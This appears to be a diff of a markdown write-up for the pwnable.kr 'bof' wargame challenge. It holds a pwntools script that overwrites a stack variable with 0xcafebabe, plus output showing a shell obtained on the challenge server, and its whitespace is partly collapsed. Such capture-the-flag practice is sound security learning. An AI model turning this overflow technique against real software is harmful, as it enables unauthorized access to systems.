@@ -12,17 +12,7 @@ b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connectin
 
 ```
 [root@VM-24-14-opencloudos ~]# uname -aLinux VM-24-14-opencloudos6.6.47-12.oc9.x86_64#1 SMP PREEMPT_DYNAMIC Tue Sep 24 16:15:42 CST 2024 x86_64 x86_64 x86_64 GNU/Linux
-```
-
-
-
-```
 frompwnimport*key = 0xcafebabebof =b'A'*13*4+ p32(key)print(bof)r = ssh('bof','pwnable.kr', password='guest', port=2222)p = r.process(executable='./bof', argv=['bof'])p.sendline(bof)p.interactive()
-```
-
-
-
-```
 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxbexbaxfexca'[x] Connecting to pwnable.kr on port2222[+] Connecting to pwnable.kr on port2222: Done[!] Couldn't check security settings on 'pwnable.kr'[x] Starting remote process './bof' on pwnable.kr[+] Starting remote process './bof' on pwnable.kr: pid 928856[!] ASLR is disabled for '/home/bof/bof'![*] Switching to interactive modeoverflow me : $ ls -altotal 48drwxr-x--- 2 root bof 4096 Jun 15 09:17 .drwxr-xr-x 118 root root 4096 Jun 1 12:05 ..-rw-r--r-- 1 root root 220 Feb 14 2025 .bash_logout-rw-r--r-- 1 root root 3771 Feb 14 2025 .bashrc-rwxr-xr-x 1 root bof 15300 Mar 26 2025 bof-rw-r--r-- 1 root root 342 Mar 26 2025 bof.c-rw------- 1 root root 46 Jun 15 09:17 .gdb_history-rw-r--r-- 1 root root 811 Apr 3 2025 .profile-rw-r--r-- 1 root root 86 Apr 3 2025 readme$
 ```
 
